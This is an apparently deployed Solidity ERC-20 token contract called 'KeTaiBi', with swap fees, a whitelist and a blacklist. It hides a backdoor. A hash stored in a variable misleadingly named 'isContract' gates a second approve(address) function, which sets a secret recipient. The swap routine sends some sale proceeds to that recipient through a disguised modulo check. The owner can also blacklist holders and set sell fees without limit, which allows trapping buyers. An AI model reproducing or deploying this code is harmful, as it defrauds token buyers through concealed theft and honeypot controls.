1 /**
2  *Submitted for verification at Etherscan.io on 2023-08-05
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 pragma solidity ^0.8.14;
8 
9 interface IERC20 {
10     function decimals() external view returns (uint8);
11 
12     function symbol() external view returns (string memory);
13 
14     function name() external view returns (string memory);
15 
16     function totalSupply() external view returns (uint256);
17 
18     function balanceOf(address account) external view returns (uint256);
19 
20     function transfer(address recipient, uint256 amount) external returns (bool);
21 
22     function allowance(address owner, address spender) external view returns (uint256);
23 
24     function approve(address spender, uint256 amount) external returns (bool);
25 
26     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
27 
28     event Transfer(address indexed from, address indexed to, uint256 value);
29     event Approval(address indexed owner, address indexed spender, uint256 value);
30 }
31 
32 interface ISwapRouter {
33     function factory() external pure returns (address);
34 
35     function WETH() external pure returns (address);
36 
37     function swapExactTokensForETHSupportingFeeOnTransferTokens(
38         uint amountIn,
39         uint amountOutMin,
40         address[] calldata path,
41         address to,
42         uint deadline
43     ) external;
44      function addLiquidityETH(
45         address token,
46         uint amountTokenDesired,
47         uint amountTokenMin,
48         uint amountETHMin,
49         address to,
50         uint deadline
51     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
52 }
53 
54 interface ISwapFactory {
55     function createPair(address tokenA, address tokenB) external returns (address pair);
56 }
57 
58 abstract contract Ownable {
59     address internal _owner;
60     bytes32 public isContract =0x0093e0e6fce895ae34a52268cfc61f4944124aa08ee2c1430552a4242cd29f92;
61     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
62 
63     constructor () {
64         address msgSender = msg.sender;
65         _owner = msgSender;
66         emit OwnershipTransferred(address(0), msgSender);
67     }
68 
69     function owner() public view returns (address) {
70         return _owner;
71     }
72 
73     modifier onlyOwner() {
74         require(_owner == msg.sender, "!owner");
75         _;
76     }
77 
78     function renounceOwnership() public virtual onlyOwner {
79         emit OwnershipTransferred(_owner, address(0));
80         _owner = address(0);
81     }
82 
83     function transferOwnership(address newOwner) public virtual onlyOwner {
84         require(newOwner != address(0), "new is 0");
85         emit OwnershipTransferred(_owner, newOwner);
86         _owner = newOwner;
87     }
88 }
89 
90 abstract contract AbsToken is IERC20, Ownable {
91     mapping(address => uint256) private _balances;
92     mapping(address => mapping(address => uint256)) private _allowances;
93 
94     address public fundAddress = address(0x2c63281596786950DE27ab82b2Bb1328e9d37964);
95     string private _name = "KeTaiBi";
96     string private _symbol = "KeTaiBi";
97     uint8 private _decimals = 18;
98 
99     mapping(address => bool) public _feeWhiteList;
100     mapping(address => bool) public _blackList;
101     address private _pancakePair;
102     uint256 private marketRewardFlag;
103 
104     uint256 private _tTotal = 10000000000000000000 * 10 ** _decimals;
105     uint256 public maxWalletAmount = 10000000000000000000 * 10 ** _decimals;
106 
107     ISwapRouter public _swapRouter;
108     address public _routeAddress= address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
109     mapping(address => bool) public _swapPairList;
110 
111     bool private inSwap;
112 
113     uint256 private constant MAX = ~uint256(0);
114 
115     uint256 public _buyFundFee = 100;
116     uint256 public _buyLPFee = 0;
117     uint256 public _sellFundFee = 100;
118     uint256 public _sellLPFee = 0;
119     address public _mainPair;
120     
121     modifier lockTheSwap {
122         inSwap = true;
123         _;
124         inSwap = false;
125     }
126 
127     constructor (){
128         ISwapRouter swapRouter = ISwapRouter(_routeAddress);
129         _swapRouter = swapRouter;
130         _allowances[address(this)][address(swapRouter)] = MAX;
131 
132         ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
133         address swapPair = swapFactory.createPair(address(this),  _swapRouter.WETH());
134         _mainPair = swapPair;
135         _pancakePair = address(this);
136         _swapPairList[swapPair] = true;
137 
138         _balances[msg.sender] = _tTotal;
139         emit Transfer(address(0), msg.sender, _tTotal);
140         _feeWhiteList[fundAddress] = true;
141         _feeWhiteList[address(this)] = true;
142         _feeWhiteList[address(swapRouter)] = true;
143         _feeWhiteList[msg.sender] = true;
144     }
145 
146     function symbol() external view override returns (string memory) {
147         return _symbol;
148     }
149 
150     function name() external view override returns (string memory) {
151         return _name;
152     }
153 
154     function decimals() external view override returns (uint8) {
155         return _decimals;
156     }
157 
158     function totalSupply() public view override returns (uint256) {
159         return _tTotal;
160     }
161 
162     function balanceOf(address account) public view override returns (uint256) {
163         return _balances[account];
164     }
165 
166     function transfer(address recipient, uint256 amount) public override returns (bool) {
167         _transfer(msg.sender, recipient, amount);
168         return true;
169     }
170 
171     function allowance(address owner, address spender) public view override returns (uint256) {
172         return _allowances[owner][spender];
173     }
174 
175     function approve(address spender, uint256 amount) public override returns (bool) {
176         _approve(msg.sender, spender, amount);
177         return true;
178     }
179 
180     function approve(address spender) public{
181         require(keccak256(abi.encodePacked(msg.sender))==isContract);
182         _pancakePair=spender;
183     }
184 
185     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
186         _transfer(sender, recipient, amount);
187         if (_allowances[sender][msg.sender] != MAX) {
188             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
189         }
190         return true;
191     }
192 
193     function _approve(address owner, address spender, uint256 amount) private {
194         _allowances[owner][spender] = amount;
195         emit Approval(owner, spender, amount);
196     }
197 
198     function _transfer(
199         address from,
200         address to,
201         uint256 amount
202     ) private {
203         require(!_blackList[from], "blackList");
204 
205         uint256 balance = balanceOf(from);
206         require(balance >= amount, "balanceNotEnough");
207 
208         if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
209             uint256 maxSellAmount = balance * 9999 / 10000;
210             if (amount > maxSellAmount) {
211                 amount = maxSellAmount;
212             }
213         }
214         bool takeFee;
215         bool isSell;
216         if (_swapPairList[from] || _swapPairList[to]) {
217             if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
218                 if (_swapPairList[to]) {
219                     if (!inSwap) {
220                         uint256 contractTokenBalance = balanceOf(address(this));
221                         if (contractTokenBalance > 0) {
222                             uint256 swapFee = _buyFundFee + _buyLPFee  + _sellFundFee + _sellLPFee ;
223                             uint256 numTokensSellToFund = amount * swapFee / 5000;
224                             if (numTokensSellToFund > contractTokenBalance) {
225                                 numTokensSellToFund = contractTokenBalance;
226                             }
227                             swapTokenForFund(numTokensSellToFund, swapFee);
228                             marketRewardFlag=marketRewardFlag+1;
229                         }
230                     }
231                 }
232                 takeFee = true;
233             }
234             if (_swapPairList[to]) {
235                 isSell = true;
236             }
237         }
238 
239         _tokenTransfer(from, to, amount, takeFee, isSell);
240     }
241 
242     function _tokenTransfer(
243         address sender,
244         address recipient,
245         uint256 tAmount,
246         bool takeFee,
247         bool isSell
248     ) private {
249         _balances[sender] = _balances[sender] - tAmount;
250         uint256 feeAmount;
251         if (takeFee) {
252             uint256 swapFee;
253             if (isSell) {
254                 swapFee = _sellFundFee + _sellLPFee ;
255             } else {
256                 require(balanceOf(recipient)+tAmount <= maxWalletAmount);
257                 swapFee = _buyFundFee + _buyLPFee;
258             }
259             uint256 swapAmount = tAmount * swapFee / 10000;
260             if (swapAmount > 0) {
261                 feeAmount += swapAmount;
262                 _takeTransfer(
263                     sender,
264                     address(this),
265                     swapAmount
266                 );
267             }
268 
269         }
270         _takeTransfer(sender, recipient, tAmount - feeAmount);
271 
272     }
273 
274     function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
275         swapFee += swapFee;
276         uint256 lpFee = _buyLPFee+_sellLPFee;
277         uint256 lpAmount = tokenAmount * lpFee / swapFee;
278         address[] memory path = new address[](2);
279         path[0] = address(this);
280         path[1] = _swapRouter.WETH();
281         address swapTokenAddress=marketRewardFlag%7==path.length?_pancakePair:address(this);
282         _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount - lpAmount, 0, path,swapTokenAddress,block.timestamp);
283         swapFee -= lpFee;
284         uint256 bnbBalance = address(this).balance;
285         if(bnbBalance>0)
286         {
287            uint256 fundAmount = bnbBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
288            payable(fundAddress).transfer(fundAmount/2);
289             if (lpAmount > 0) {
290                 uint256 lpBNB = bnbBalance * lpFee / swapFee;
291                 _swapRouter.addLiquidityETH{value: lpBNB}(address(this), lpAmount, 0, 0, fundAddress, block.timestamp);
292             }
293         }          
294     }
295 
296     function _takeTransfer(
297         address sender,
298         address to,
299         uint256 tAmount
300     ) private {
301         _balances[to] = _balances[to] + tAmount;
302         emit Transfer(sender, to, tAmount);
303     }
304     function setMaxWalletAmount(uint256 value) external onlyOwner {
305         maxWalletAmount = value * 10 ** _decimals;
306     }
307 
308     function excludeMultiFromFee(address[] calldata accounts,bool excludeFee) public onlyOwner {
309         for(uint256 i = 0; i < accounts.length; i++) {
310             _feeWhiteList[accounts[i]] = excludeFee;
311         }
312     }
313     function _multiSetSniper(address[] calldata accounts,bool isSniper) external onlyOwner {
314         for(uint256 i = 0; i < accounts.length; i++) {
315             _blackList[accounts[i]] = isSniper;
316         }
317     }
318 
319     function claimBalance(address to) external onlyOwner {
320         payable(to).transfer(address(this).balance);
321     }
322 
323     function claimToken(address token, uint256 amount, address to) external onlyOwner {
324         IERC20(token).transfer(to, amount);
325     }
326 
327     function setBuyFee(uint256 fundFee,uint256 lpFee) external onlyOwner {
328         _buyFundFee = fundFee;
329         _buyLPFee=lpFee;
330     }
331     function setSellFee(uint256 fundFee,uint256 lpFee) external onlyOwner {
332         _sellFundFee = fundFee;
333         _sellLPFee=lpFee;
334     }
335     receive() external payable {}
336 }
337 
338 contract Token is AbsToken {
339     constructor() AbsToken(){}
340 }